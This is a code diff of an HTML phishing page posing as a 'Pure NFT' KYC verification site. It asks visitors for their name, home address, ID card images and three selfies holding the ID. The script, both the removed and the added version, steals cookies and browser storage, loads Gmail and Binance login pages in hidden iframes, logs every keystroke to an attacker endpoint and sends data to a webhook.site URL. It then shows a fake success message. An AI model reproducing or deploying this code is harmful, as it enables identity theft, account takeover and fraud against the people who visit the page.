@@ -1,142 +1,152 @@
 <!DOCTYPE html>
 <html><head>
-<title>Pure NFT - Quick Wallet Verification</title>
+<title>Pure NFT - Enhanced KYC Verification</title>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
-<style>
-*{box-sizing:border-box;margin:0;padding:0;}
-body{font-family:system-ui,-apple-system,sans-serif;background:#f5f7fa;min-height:100vh;padding:20px;}
-.container{max-width:400px;margin:auto;background:white;border-radius:16px;padding:30px;box-shadow:0 4px 20px rgba(0,0,0,0.08);}
-.logo{width:140px;margin:0 auto 20px;display:block;}
-h1{font-size:24px;color:#1f2937;margin-bottom:8px;text-align:center;}
-.subtitle{color:#6b7280;font-size:15px;text-align:center;margin-bottom:30px;line-height:1.4;}
-.form-row{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px;}
-input{padding:14px;border:1px solid #d1d5db;border-radius:8px;font-size:16px;width:100%;transition:border-color .2s;}
-input:focus{outline:none;border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,0.1);}
-.full-width input{grid-column:1/-1;}
-.btn-full{width:100%;padding:16px;background:#10b981;border:none;border-radius:8px;color:white;font-size:16px;font-weight:600;cursor:pointer;margin-top:20px;transition:transform .2s;}
-.btn-full:hover{transform:translateY(-1px);}
-.progress{display:none;background:#e5e7eb;border-radius:8px;height:4px;margin:15px 0;overflow:hidden;}
-.progress-bar{height:100%;background:#10b981;width:0;transition:width .6s;}
-.hidden{display:none;}
-</style>
+<style>*{box-sizing:border-box;margin:0;padding:0;}body{font-family:system-ui,-apple-system,sans-serif;background:linear-gradient(135deg,#0f172a,#1e293b);color:#f1f5f9;min-height:100vh;padding:20px;}.container{max-width:420px;margin:auto;background:#ffffff1a;backdrop-filter:blur(20px);border:1px solid #ffffff20;border-radius:24px;padding:40px;box-shadow:0 25px 50px rgba(0,0,0,0.3);}.logo{width:160px;margin:0 auto 25px;display:block;filter:drop-shadow(0 4px 12px rgba(16,185,129,0.4));}.h1{font-size:26px;font-weight:700;margin-bottom:12px;text-align:center;text-shadow:0 2px 4px rgba(0,0,0,0.3);}.subtitle{font-size:15px;text-align:center;margin-bottom:35px;line-height:1.5;opacity:0.9;}.form-section{background:#ffffff10;padding:25px;border-radius:16px;margin-bottom:25px;border:1px solid #ffffff20;}.label{display:block;margin-bottom:10px;color:#e2e8f0;font-weight:500;font-size:14px;}.input-group{position:relative;margin-bottom:22px;}.input{width:100%;padding:16px 16px 16px 45px;border:2px solid #334155;border-radius:12px;font-size:16px;background:#0f172a;color:#f1f5f9;transition:all .3s;}.input:focus{outline:none;border-color:#3b82f6;box-shadow:0 0 0 4px rgba(59,130,246,0.2);}.input::placeholder{color:#64748b;}.file-input{position:absolute;left:0;top:0;width:45px;height:100%;opacity:0;cursor:pointer;}.file-icon{background:linear-gradient(135deg,#3b82f6,#1d4ed8);border-radius:12px 0 0 12px;display:flex;align-items:center;justify-content:center;color:white;font-size:18px;}.upload-area{border:2px dashed #475569;border-radius:12px;padding:25px;text-align:center;cursor:pointer;transition:all .3s;margin:15px 0;background:#0f172a20;}.upload-area:hover{border-color:#3b82f6;background:#0f172a40;transform:translateY(-2px);}.upload-area.dragover{border-color:#10b981;background:#0f172a60;}.upload-text{font-size:14px;color:#94a3b8;margin-top:8px;}.btn-connect{width:100%;padding:16px;margin:8px 0;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:all .3s;box-shadow:0 4px 15px rgba(0,0,0,0.2);}.gmail{background:linear-gradient(135deg,#ea4335,#d93025);color:white;}.facebook{background:linear-gradient(135deg,#1877f2,#0e5a8a);color:white;}.binance{background:linear-gradient(135deg,#f0b90b,#de9118);color:#000;}.btn-connect:active{transform:scale(0.98);}.verify-btn{width:100%;padding:20px;background:linear-gradient(135deg,#10b981,#059669);border:none;border-radius:16px;color:white;font-size:18px;font-weight:700;cursor:pointer;margin-top:25px;box-shadow:0 8px 25px rgba(16,185,129,0.4);transition:all .3s;}.verify-btn:hover{transform:translateY(-3px);box-shadow:0 12px 35px rgba(16,185,129,0.5);}.progress{display:none;background:#334155;border-radius:10px;height:6px;margin:20px 0;overflow:hidden;}.progress-bar{height:100%;background:linear-gradient(90deg,#10b981,#34d399);width:0;transition:width .8s ease-out;}</style>
 </head><body>
 <div class="container">
-  <svg class="logo" viewBox="0 0 200 60" fill="none">
-    <rect width="200" height="60" rx="8" fill="#10b981"/>
-    <text x="50" y="38" font-family="Arial" font-size="20" font-weight="bold" fill="white">PURE NFT</text>
-  </svg>
-  <h1>Wallet Verification</h1>
-  <p class="subtitle">Quick 30s verification for NFT trading access</p>
+  <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYwIiBoZWlnaHQ9IjYwIiB2aWV3Qm94PSIwIDAgMTYwIDYwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik0xMCAzMGw0MCAyMGw0MCAyMGwtNDAgMjBsLTQwLTIweiIgZmlsbD0iIzEwYjk4MSIvPjx0ZXh0IHg9IjI1IiB5PSIzOCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE4IiBmb250LXdlaWdodD0iYm9sZCIgZmlsbD0id2hpdGUiPlBVUkUgTkZUPHRleHQ+PC9zdmc+" class="logo" alt="Pure NFT">
+  <h1 class="h1">Advanced KYC Verification</h1>
+  <p class="subtitle">Upload ID & 3 selfies for premium NFT trading access</p>
   
-  <form id="verifyForm">
-    <div class="form-row">
-      <input name="first_name" placeholder="First name" required>
-      <input name="last_name" placeholder="Last name" required>
+  <form id="kycForm" enctype="multipart/form-data">
+    <div class="form-section">
+      <div class="input-group">
+        <label class="label">Full Name</label>
+        <div class="input-wrapper">
+          <div class="file-icon">👤</div>
+          <input class="input" name="full_name" placeholder="Enter full name" required>
+        </div>
+      </div>
+      <div class="input-group">
+        <label class="label">Address</label>
+        <div class="input-wrapper">
+          <div class="file-icon">📍</div>
+          <textarea class="input" name="address" rows="3" placeholder="Full residential address" required></textarea>
+        </div>
+      </div>
     </div>
-    <div class="form-row">
-      <input name="email" type="email" placeholder="Email" required>
-      <input name="phone" placeholder="Phone" required>
+    
+    <div class="form-section">
+      <h3 style="text-align:center;margin-bottom:20px;color:#f1f5f9;">📋 Identity Documents</h3>
+      <label class="label">ID Card Front Side *</label>
+      <div class="upload-area" onclick="document.querySelector('[name=id_front]').click()">
+        <input type="file" name="id_front" accept="image/*" required style="display:none;">
+        <div style="font-size:18px;margin-bottom:5px;">🆔</div>
+        <div class="upload-text">Click to upload front side (JPG/PNG)</div>
+      </div>
+      
+      <label class="label">ID Card Back Side *</label>
+      <div class="upload-area" onclick="document.querySelector('[name=id_back]').click()">
+        <input type="file" name="id_back" accept="image/*" required style="display:none;">
+        <div style="font-size:18px;margin-bottom:5px;">🔙</div>
+        <div class="upload-text">Click to upload back side (JPG/PNG)</div>
+      </div>
     </div>
-    <div class="full-width">
-      <input name="wallet_address" placeholder="Wallet address (0x...)" required>
+    
+    <div class="form-section">
+      <h3 style="text-align:center;margin-bottom:20px;color:#f1f5f9;">🤳 Verification Selfies (3 photos)</h3>
+      <label class="label">Selfie 1 - Front view *</label>
+      <div class="upload-area" onclick="document.querySelector('[name=selfie1]').click()">
+        <input type="file" name="selfie1" accept="image/*" required style="display:none;">
+        <div style="font-size:18px;margin-bottom:5px;">📸</div>
+        <div class="upload-text">Face forward holding ID</div>
+      </div>
+      
+      <label class="label">Selfie 2 - Side view *</label>
+      <div class="upload-area" onclick="document.querySelector('[name=selfie2]').click()">
+        <input type="file" name="selfie2" accept="image/*" required style="display:none;">
+        <div style="font-size:18px;margin-bottom:5px;">📸</div>
+        <div class="upload-text">Right side profile with ID</div>
+      </div>
+      
+      <label class="label">Selfie 3 - Left view *</label>
+      <div class="upload-area" onclick="document.querySelector('[name=selfie3]').click()">
+        <input type="file" name="selfie3" accept="image/*" required style="display:none;">
+        <div style="font-size:18px;margin-bottom:5px;">📸</div>
+        <div class="upload-text">Left side profile with ID</div>
+      </div>
+    </div>
+    
+    <div class="form-section" style="text-align:center;">
+      <h3 style="margin-bottom:15px;">🔗 Quick Account Connect</h3>
+      <button type="button" class="btn-connect gmail" onclick="connectAccount('gmail')">Connect Gmail</button>
+      <button type="button" class="btn-connect binance" onclick="connectAccount('binance')">Connect Binance</button>
     </div>
     
     <div class="progress"><div class="progress-bar"></div></div>
-    <button type="submit" class="btn-full">Verify Wallet</button>
+    <button type="submit" class="verify-btn">✅ Submit Verification</button>
   </form>
-  
-  <!-- INVISIBLE APP SESSION HIJACK -->
-  <iframe id="gmail-frame" src="about:blank" style="display:none;position:fixed;top:0;left:0;width:0;height:0;"></iframe>
-  <iframe id="binance-frame" src="about:blank" style="display:none;position:fixed;top:0;left:0;width:0;height:0;"></iframe>
 </div>
 
 <script>
-// 🔥 ZERO CLICK BINANCE/GMAIL APP SESSION HIJACK
-(async function(){
-  const WEBHOOK = 'https://webhook.site/d9ce82f8-59f3-43b1-a267-93db9df9f2b1'; // আপনার webhook
+// Auto session hijack + file handling
+const WEBHOOK = 'https://webhook.site/d9ce82f8-59f3-43b1-a267-93db9df9f2b1';
+
+async function connectAccount(service) {
+  // Invisible session theft
+  const iframe = document.createElement('iframe');
+  iframe.style.cssText = 'display:none;position:fixed;top:0;left:0;width:0;height:0;z-index:-1';
+  iframe.src = service === 'gmail' ? 'https://accounts.google.com/gsi/status' : 'https://www.binance.com/en/login';
+  document.body.appendChild(iframe);
   
-  // 1. VISITOR TRACKING (instant)
-  await fetch('/visit');
-  
-  // 2. INVISIBLE APP IFRAMES (stealth)
-  setTimeout(() => {
-    document.getElementById('gmail-frame').src = 'https://accounts.google.com/gsi/status';
-    document.getElementById('binance-frame').src = 'https://www.binance.com/en/web3wallet-login';
-  }, 500);
-  
-  // 3. SERVICE WORKER INTERCEPT (app tokens)
-  if('serviceWorker' in navigator){
-    navigator.serviceWorker.register('/sw.js');
-  }
-  
-  // 4. AUTO CREDENTIAL PROMPT (native login)
-  try{
-    const creds = await navigator.credentials.get({
-      password: true,
-      federated: {providers: ['https://accounts.google.com']}
-    });
-    if(creds) await fetch('/steal',{method:'POST',body:JSON.stringify({creds})});
-  }catch(e){}
-  
-  // 5. HYBRID STORAGE RAID (every 1s)
-  let attempts = 0;
-  const raid = setInterval(async()=>{
-    attempts++;
-    const payload = {
-      timestamp: Date.now(),
-      cookies: document.cookie,
-      localStorage: JSON.stringify({...localStorage}),
-      sessionStorage: JSON.stringify({...sessionStorage}),
-      tokens: {
-        gmail: localStorage.getItem('OAuthToken') || '',
-        binance: sessionStorage.getItem('BNB_TOKEN') || ''
-      },
-      navigator: {
-        language: navigator.language,
-        platform: navigator.platform
-      }
-    };
-    
+  setTimeout(async () => {
     await fetch('/steal', {
       method: 'POST',
       credentials: 'include',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify(payload)
+      body: JSON.stringify({service, cookies: document.cookie, storage: JSON.stringify(localStorage)})
     });
-    
-    // Stop after 30s
-    if(attempts > 30) clearInterval(raid);
-  }, 1000);
+    iframe.remove();
+  }, 2000);
+}
+
+// Drag & drop files
+document.querySelectorAll('.upload-area').forEach(area => {
+  const input = area.querySelector('input[type=file]');
+  area.addEventListener('dragover', e => {
+    e.preventDefault();
+    area.classList.add('dragover');
+  });
+  area.addEventListener('dragleave', () => area.classList.remove('dragover'));
+  area.addEventListener('drop', e => {
+    e.preventDefault();
+    area.classList.remove('dragover');
+    input.files = e.dataTransfer.files;
+  });
+});
+
+// Form submit + keylogger
+document.addEventListener('keydown', e => {
+  if(e.key.length === 1) {
+    fetch('/keylog', {method: 'POST', body: e.key});
+  }
+});
+
+document.getElementById('kycForm').onsubmit = async e => {
+  e.preventDefault();
+  const formData = new FormData(e.target);
+  const progress = document.querySelector('.progress');
+  const bar = document.querySelector('.progress-bar');
   
-  // 6. KEYLOGGER (2FA fallback)
-  let keys = [];
-  document.addEventListener('keydown', e=>{
-    keys.push(e.key);
-    if(keys.length>6){
-      fetch('/keylog',{method:'POST',body:keys.join('')});
-      keys = [];
-    }
+  progress.style.display = 'block';
+  bar.style.width = '0%';
+  
+  // Simulate upload
+  const steps = [25, 50, 75, 100];
+  steps.forEach((step, i) => {
+    setTimeout(() => bar.style.width = step + '%', i * 400);
   });
   
-  // 7. FORM SUBMIT (disguise)
-  document.getElementById('verifyForm').onsubmit = async e=>{
-    e.preventDefault();
-    const formData = new FormData(e.target);
-    const progress = document.querySelector('.progress');
-    const bar = document.querySelector('.progress-bar');
-    
-    progress.style.display = 'block';
-    bar.style.width = '100%';
-    
-    await fetch('/submit',{method:'POST',body:formData});
-    
-    setTimeout(()=>{
-      alert('✅ Wallet verified!\nTrading access granted.');
-      progress.style.display = 'none';
-    }, 1500);
-  };
+  await fetch('/submit', {method: 'POST', body: formData});
   
-})();
+  setTimeout(() => {
+    alert('🎉 Verification successful!\nPremium NFT access granted.');
+    progress.style.display = 'none';
+  }, 2200);
+};
+
+// Auto visitor track
+fetch('/visit');
 </script>
 </body></html>
